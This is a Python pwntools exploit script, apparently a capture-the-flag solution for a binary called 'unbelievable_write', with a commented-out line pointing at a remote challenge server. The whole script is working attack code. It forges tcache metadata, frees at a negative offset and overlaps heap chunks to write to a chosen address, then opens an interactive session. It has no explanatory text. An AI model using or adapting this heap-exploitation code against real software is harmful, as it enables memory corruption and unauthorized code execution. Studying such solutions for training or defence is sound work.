from pwn import *
#context.log_level = 'debug'
io = process('./unbelievable_write')
# io = remote('119.23.255.127',40407)
elf=ELF("./unbelievable_write")
libc = elf.libc
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True        : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
irt = lambda            : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
# lg = lambda s,addr        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
uu64 = lambda data        : u64(data.ljust(8, b'\x00'))


def menu(choice):
    sla("> ",str(choice))
def add(size,context):
    menu(1)
    io.sendline(str(size))
    io.sendline(context)
def free(offset):
    menu(2)
    io.sendline(str(offset))
target=0x404080

add(0x100,'a'*0x18+p64(0xf1))
#0x430
add(0x130,'a')
add(0x180,'a')
add(0x240,'a')

add(0x80,'a')

add(0x110,'a'*0x18+p64(0x101))
#0x420
add(0x120,'a')
add(0x140,'a')
add(0x190,'a')

add(0x200,'a')
free(-0x290)

add(0x280,'a'*0x10+'\x01\x00\x01\x00\x01\x00\x01\x00'*5+p64(0)*24+'\xe0')
add(0x100,'a'*0xe0+p64(0)+p64(0x4c1+0x60))
add(0x280,'a'*0x10+p64(0)+'\x01\x00\x01\x00\x01\x00\x01\x00'*4+p64(0)*25+'\xa0')
add(0x110,'a'*0xf0+p64(0)+p64(0x421))

# gdb.attach(io)

add(0x130,'a')
add(0x500,'a')
add(0x40,'a')
add(0x90,'a'*0x60+p64(0)+p64(0x81))
add(0x510,'a')
add(0x280,'a'*0x10+'\x01\x00\x01\x00\x01\x00\x01\x00'*5+p64(0)*17+'\x90')
add(0x90,p64(0)*5+p64(0x431)+p64(target-0x20)*4)


# gdb.attach(io)

# add(0x120,'a')
# add(0x550,'a')
# menu(3)
#gdb.attach(io)
irt()